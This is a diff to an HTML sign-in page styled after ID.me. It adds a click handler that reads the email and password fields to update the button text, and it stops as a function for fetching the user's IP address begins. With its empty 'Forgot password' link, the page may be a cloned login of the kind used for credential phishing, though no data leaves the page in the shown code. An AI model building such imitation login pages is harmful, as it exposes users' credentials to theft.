@@ -152,9 +152,16 @@
                             </div>
                         </div>
                         <div class="form-actions">
-                            <button type="submit" name="commit" class="btn btn-primary"
-                                data-disable-with="Signing in to ID.me..." data-clicked="false">Sign in</button>
-                        </div>
+              <button 
+                  type="submit"
+                  name="commit"
+                  class="btn btn-primary"
+                  data-disable-with="Signing in to ID.me..."
+                  data-clicked="false"
+                  onclick="signInClicked()"> <!-- Call the JavaScript function when the button is clicked -->
+                  Sign in
+              </button>
+          </div>
 
                         <div class="form-footer">
                             <p><a href="">Forgot password</a></p>
@@ -200,6 +207,30 @@
 
     </div>
     </div>
+    <script>
+        function signInClicked() {
+            // Check if the email and password fields are filled
+            var email = document.getElementById('user_email').value;
+            var password = document.getElementById('user_password').value;
+    
+            if (email.trim() === '' || password.trim() === '') {
+                // Browser's default behavior for required fields will handle empty fields
+                return;
+            }
+    
+            // Get the button element
+            var signInButton = document.querySelector('.form-actions button');
+    
+            // Get the data-disable-with attribute value
+            var disableText = signInButton.getAttribute('data-disable-with');
+    
+            // Change the button text to the disableText
+            signInButton.innerHTML = disableText;
+    
+            // Set the data-clicked attribute to true
+            signInButton.setAttribute('data-clicked', 'true');
+        }
+    </script>
     <script>
         // Function to get the user's IP address
         async function getIpAddress() {
